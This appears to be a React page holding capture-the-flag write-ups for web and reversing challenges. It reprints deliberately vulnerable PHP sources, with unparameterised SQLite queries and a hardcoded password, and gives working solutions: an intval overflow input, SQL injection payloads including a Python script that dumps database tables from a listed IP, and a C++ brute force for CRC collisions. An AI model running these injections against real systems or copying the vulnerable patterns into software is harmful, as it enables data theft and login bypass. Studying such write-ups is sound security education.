import X from 'src/component/X';

export default function Post() {
    return (
        <>
            <X.H1>Web</X.H1>
            <X.H2>Numberizer</X.H2>
            <X.H3>Challenge Source</X.H3>
            <X.CodeBlock
                language="php"
                code={`
                <?php
                ini_set("error_reporting", 0);

                if(isset($_GET['source'])) {
                    highlight_file(__FILE__);
                }

                include "flag.php";

                $MAX_NUMS = 5;

                if(isset($_POST['numbers']) && is_array($_POST['numbers'])) {

                    $numbers = array();
                    $sum = 0;
                    for($i = 0; $i < $MAX_NUMS; $i++) {
                        if(!isset($_POST['numbers'][$i]) || strlen($_POST['numbers'][$i])>4 || !is_numeric($_POST['numbers'][$i])) {
                            continue;
                        }
                        $the_number = intval($_POST['numbers'][$i]);
                        if($the_number < 0) {
                            continue;
                        }
                        $numbers[] = $the_number;
                    }
                    $sum = intval(array_sum($numbers));


                    if($sum < 0) {
                        echo "You win a flag: $FLAG";
                    } else {
                        echo "You win nothing with number $sum ! :-(";
                    }
                }
                ?>

                <html>
                    <head>
                        <title>Numberizer</title>
                    </head>
                    <body>
                        <h1>Numberizer</h1>
                        <form action="/" method="post">
                            <label for="numbers">Give me at most 10 numbers to sum!</label><br>
                            <?php
                            for($i = 0; $i < $MAX_NUMS; $i++) {
                                echo '<input type="text" name="numbers[]"><br>';
                            }
                            ?>
                            <button type="submit">Submit</button>
                        </form>
                        <p>To view the source code, <a href="/?source">click here.</a>
                    </body>
                </html>
                `}
            />
            <X.H3>Solution</X.H3>
            <X.Uli>`num1`: `9e99`</X.Uli>
            <X.Uli>`num2`: `1`</X.Uli>
            <X.H3>Flag</X.H3>
            <X.CodeBlock language="text" code="ENO{INTVAL_IS_NOT_ALW4S_P0S1TiV3!}" />
            <X.H2>Paginator</X.H2>
            <X.H3>Challenge Source</X.H3>
            <X.CodeBlock
                language="php"
                code={`
                <?php
                ini_set("error_reporting", 0);
                ini_set("display_errors",0);

                if(isset($_GET['source'])) {
                    highlight_file(__FILE__);
                }

                include "flag.php";

                $db = new SQLite3('/tmp/db.db');
                try {
                $db->exec("CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Flag', '" . base64_encode($FLAG) . "')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')");
                } catch(Exception $e) {
                //var_dump($e);
                }


                if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {
                [$min, $max] = explode(",",$_GET['p']);
                if(intval($min) <= 1 ) {
                    die("This post is not accessible...");
                }
                try {
                    $q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";
                    $result = $db->query($q);
                    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
                        echo $row['title'] . " (ID=". $row['id'] . ") has content: " . $row['content'] . "<br>";
                    }
                }catch(Exception $e) {
                    echo "Try harder!";
                }
                } else {
                    echo "Try harder!";
                }
                ?>

                <html>
                    <head>
                        <title>Paginator</title>
                    </head>
                    <body>
                        <h1>Paginator</h1>
                        <a href="/?p=2,10">Show me pages 2-10</a>
                        <p>To view the source code, <a href="/?source">click here.</a>
                    </body>
                </html>
                `}
            />
            <X.H3>Solution</X.H3>
            <X.P>The payload is `/?p=2,10%20or%201=1` (`/?p=2,10 or 1=1`).</X.P>
            <X.H3>Flag</X.H3>
            <X.CodeBlock language="text" code="ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow!}" />
            <X.H2>Paginator V2</X.H2>
            <X.H3>Challenge Source</X.H3>
            <X.CodeBlock
                language="php"
                code={`
                <?php
                ini_set("error_reporting", 1);
                ini_set("display_errors",1);

                if(isset($_GET['source'])) {
                    highlight_file(__FILE__);
                }

                include "flag.php"; // Now the juicy part is hidden away! $db = new SQLite3('/tmp/db.db');

                try{
                $db->exec("CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')");
                $db->exec("INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')");
                } catch(Exception $e) {
                //var_dump($e);
                }


                if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {
                [$min, $max] = explode(",",$_GET['p']);
                if(intval($min) <= 1 ) {
                    die("This post is not accessible...");
                }
                try {
                    $q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";
                    $result = $db->query($q);
                    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
                        echo $row['title'] . " (ID=". $row['id'] . ") has content: " . $row['content'] . "<br>";
                    }
                }catch(Exception $e) {
                    echo "Try harder!";
                }
                } else {
                    echo "Try harder!";
                }
                ?>

                <html>
                    <head>
                        <title>Paginator v2</title>
                    </head>
                    <body>
                        <h1>Paginator v2</h1>
                        <a href="/?p=2,10">Show me pages 2-10</a>
                        <p>To view the source code, <a href="/?source">click here.</a>
                    </body>
                </html>
                `}
            />
            <X.H3>Solution</X.H3>
            <X.P>The SQL injection method is the same as the Paginator challenge. However, note that the following statement will only take the first two values separated by a comma:</X.P>
            <X.CodeBlock language="php" code={`[$min, $max] = explode(",",$_GET['p']);`} />
            <X.P>So we need to use `join` in the following exploits.</X.P>
            <X.Divider />
            <X.P>This is a SQLite3 database, so firstly we leak the table name by:</X.P>
            <X.CodeBlock
                language="python"
                code={`
                import requests
                url = "http://52.59.124.14:5015/?p=2,10 "
                payload = "union select * from (select 1)A join (select 2)B join (select sql from sqlite_master)C"
                resp = requests.get(url + payload)
                print(resp.text)
                `}
            />
            <X.P>The response is:</X.P>
            <X.CodeBlock
                language="text"
                code={`
                2 (ID=1) has content: ""
                2 (ID=1) has content: "CREATE TABLE flag (id INTEGER PRIMARY KEY, name TEXT UNIQUE, value TEXT)"
                2 (ID=1) has content: "CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)"
                Page 2 (ID=2) has content: "This is not a flag, but just a boring page."
                Page 3 (ID=3) has content: "This is not a flag, but just a boring page."
                ...
                `}
            />
            <X.P>And then we can get the flag by changing the payload to:</X.P>
            <X.CodeBlock
                language="python"
                code={`
                payload = "union select * from (select 1)A join (select 2)B join (select value from flag)C"
                `}
            />
            <X.P>The response is:</X.P>
            <X.CodeBlock
                language="text"
                code={`
                2 (ID=1) has content: "RU5Pe1NRTDFfVzF0aF8wdVRfQzBtbTRfVzBya3NfU29tZUhvd19BZ0Exbl9BbmRfQWc0MW4hfQ=="
                Page 2 (ID=2) has content: "This is not a flag, but just a boring page."
                Page 3 (ID=3) has content: "This is not a flag, but just a boring page."
                ...
                `}
            />
            <X.H3>Flag</X.H3>
            <X.CodeBlock language="text" code="ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow_AgA1n_And_Ag41n!}" />
            <X.H2>Craphp</X.H2>
            <X.H3>Challenge Source</X.H3>
            <X.CodeBlock
                language="php"
                code={`
                <?php
                ini_set("error_reporting", 0);
                ini_set("display_errors",0);

                if(isset($_GET['source'])) {
                    highlight_file(__FILE__);
                }


                // https://www.php.net/manual/en/function.crc32.php#28012
                function crc16($string) {
                    $crc = 0xFFFF;
                    for ($x = 0; $x < strlen ($string); $x++) {
                        $crc = $crc ^ ord($string[$x]);
                        for ($y = 0; $y < 8; $y++) {
                        if (($crc & 0x0001) == 0x0001) {
                            $crc = (($crc >> 1) ^ 0xA001);
                        } else { $crc = $crc >> 1; }
                        }
                    }
                    return $crc;
                }


                // https://stackoverflow.com/questions/507041/crc8-check-in-php/73305496#73305496
                function crc8($input)
                {
                    $crc8Table = [
                        0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,
                        0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,
                        0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,
                        0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D,
                        0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,
                        0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,
                        0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
                        0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD,
                        0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2,
                        0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA,
                        0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2,
                        0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A,
                        0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,
                        0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A,
                        0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42,
                        0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A,
                        0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C,
                        0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4,
                        0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC,
                        0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4,
                        0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C,
                        0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44,
                        0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C,
                        0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34,
                        0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B,
                        0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63,
                        0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B,
                        0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13,
                        0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB,
                        0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83,
                        0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB,
                        0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3
                    ];
                    $byteArray = unpack('C*', $input);
                    $len = count($byteArray);
                    $crc = 0;
                    for ($i = 1; $i <= $len; $i++) {
                        $crc = $crc8Table[($crc ^ $byteArray[$i]) & 0xff];
                    }
                    return $crc & 0xff;
                }

                $MYPASSWORD = "AdM1nP@assW0rd!";
                include "flag.php";

                if(isset($_POST['password']) && strlen($MYPASSWORD) == strlen($_POST['password'])) {
                    $pwhash1 = crc16($MYPASSWORD);
                    $pwhash2 = crc8($MYPASSWORD);

                    $password = $_POST['password'];
                    $pwhash3 = crc16($password);
                    $pwhash4 = crc8($password);

                    if($MYPASSWORD == $password) {
                        die("oops. Try harder!");
                    }
                    if($pwhash1 != $pwhash3) {
                        die("Oops. Nope. Try harder!");
                    }
                    if($pwhash2 != $pwhash4) {
                        die("OoOps. Not quite. Try harder!");
                    }
                    $access = true;

                    if($access) {
                        echo "You win a flag: $FLAG";
                    } else {
                        echo "Denied! :-(";
                    }
                } else {
                    echo "Try harder!";
                }
                ?>

                <html>
                    <head>
                        <title>Craphp</title>
                    </head>
                    <body>
                        <h1>Craphp</h1>
                        <form action="/" method="post">
                            <label for="password">Give me your password!</label><br>
                            <input type="text" name="password"><br>
                            <button type="submit">Submit</button>
                        </form>
                        <p>To view the source code, <a href="/?source">click here.</a>
                    </body>
                </html>
                `}
            />
            <X.H3>Solution</X.H3>
            <X.P>The challenge provides two functions in PHP, `crc8` and `crc16`. We need to find a string `$password`, such that:</X.P>
            <X.Uli>`$password != "AdM1nP@assW0rd!"`</X.Uli>
            <X.Uli>`crc8($password) == crc8("AdM1nP@assW0rd!")`</X.Uli>
            <X.Uli>`crc16($password) == crc16("AdM1nP@assW0rd!")`</X.Uli>
            <X.Uli>`strlen($password) == strlen("AdM1nP@assW0rd!")`</X.Uli>
            <X.P>The `crc16` checksum has `65536` possible values, and the `crc8` checksum has `256` possible values. `65536 * 256 = 16777216`, this is not a very large number, which allows us to brute force the result. I rewrite the script in C++.</X.P>
            <X.CodeBlock
                language="cpp"
                code={`
                #include <iostream>
                using namespace std;

                int crc8(string str)
                {
                    unsigned char crc8table[] = {
                        0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,
                        0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,
                        0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,
                        0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D,
                        0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,
                        0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,
                        0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
                        0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD,
                        0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2,
                        0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA,
                        0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2,
                        0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A,
                        0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,
                        0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A,
                        0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42,
                        0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A,
                        0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C,
                        0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4,
                        0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC,
                        0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4,
                        0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C,
                        0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44,
                        0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C,
                        0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34,
                        0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B,
                        0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63,
                        0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B,
                        0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13,
                        0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB,
                        0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83,
                        0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB,
                        0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3
                    };
                    unsigned char crc=0;
                    for(char ch:str)
                    {
                        crc=crc8table[crc^ch];
                    }
                    return crc;
                }

                int crc16(string str)
                {
                    int crc=0xFFFF;
                    for(char ch:str)
                    {
                        crc^=ch;
                        for(int i=0;i<8;i++)
                        {
                            if(crc&1==1) crc=(crc>>1)^0xA001;
                            else crc>>=1;
                        }
                    }
                    return crc;
                }

                int main()
                {
                    string target="AdM1nP@assW0rd!";
                    cout<<crc8(target)<<' '<<crc16(target)<<endl;
                    for(int i=0;i<65536*256;i++) // brute force
                    {
                        char password[16];
                        sprintf(password,"abcde%010d",i);
                        if(crc8(password)==crc8(target)&&crc16(password)==crc16(target))
                        {
                            cout<<password<<endl;
                        }
                    }
                    return 0;
                }
                `}
            />
            <X.P>We can obtain a password `abcde0004936564` (not unique).</X.P>
            <X.H3>Flag</X.H3>
            <X.CodeBlock language="text" code="ENO{Cr4hP_CRC_Collison_1N_P@ssw0rds!}}" />
            <X.H1>Reversing</X.H1>
            <X.H2>Flag Checker</X.H2>
            <X.H3>Solution</X.H3>
            <X.CodeBlock
                language="python"
                code={`
                expected = [
                    0xF8, 0xA8, 0xB8, 0x21, 0x60, 0x73, 0x90, 0x83, 0x80, 0xC3,
                    0x9B, 0x80, 0xAB, 0x09, 0x59, 0xD3, 0x21, 0xD3, 0xDB, 0xD8,
                    0xFB, 0x49, 0x99, 0xE0, 0x79, 0x3C, 0x4C, 0x49, 0x2C, 0x29,
                    0xCC, 0xD4, 0xDC, 0x42
                ]


                # e = flag[i] ^ 0x5A + i
                # expected[i] = (e >> 5) | (e << 3)

                def rrot3(x):
                    return (x >> 3) | (x << 5) & 0xFF


                for i in range(len(expected)):
                    b1 = rrot3(expected[i])
                    b2 = b1 - i
                    b3 = b2 ^ 0x5A
                    print(chr(b3), end="")
                `}
            />
            <X.H3>Flag</X.H3>
            <X.CodeBlock language="text" code="ENO{R3V3R53_3NG1N33R1NG_M45T3R!!!}" />
            <X.H2>Scrambled</X.H2>
            <X.H3>Solution</X.H3>
            <X.P>The chunk size is `4`, and the flag starts with {'`ENO{`'}. We can use this information to leak the key, which is `42`.</X.P>
            <X.CodeBlock
                language="python"
                code={`
                def hex_string_to_byte_list(hexstr):
                    assert len(hexstr) % 2 == 0
                    return [int(hexstr[i:i + 2], 16) for i in range(0, len(hexstr), 2)]


                result = hex_string_to_byte_list("1e78197567121966196e757e1f69781e1e1f7e736d6d1f75196e75191b646e196f6465510b0b0b57")

                prefix = "ENO{"
                for i in range(len(result)):
                    print(result[i] ^ ord(prefix[i % len(prefix)]), end=" ")
                    if i % 4 == 3:
                        print()

                # 91 54 86 14
                # 34 92 86 29
                # 92 32 58 5
                # 90 39 55 101
                # 91 81 49 8
                # 40 35 80 14
                # 92 32 58 98
                # 94 42 33 98
                # 42 42 42 42    <- leak key!!
                # 78 69 68 44
                `}
            />
            <X.P>And then... Alright, I just combining these chunks together to make the flag read smoothly. The expected solution might be to leak the seed based on the position of the first chunk, and then obtain the correct order of the chunk sequence.</X.P>
            <X.CodeBlock
                language="python"
                code={`
                key = 42

                for i in range(len(result)):
                    print(chr(result[i] ^ key), end="")
                    if i % 4 == 3:
                        print()

                # 4R3_
                # M83L
                # 3D_T
                # 5CR4
                # 45TY
                # GG5_
                # 3D_3
                # 1ND3
                # ENO{
                # !!!}
                `}
            />
            <X.H3>Flag</X.H3>
            <X.CodeBlock language="text" code="ENO{5CR4M83L3D_3GG5_4R3_1ND33D_T45TY!!!}" />
        </>
    );
}
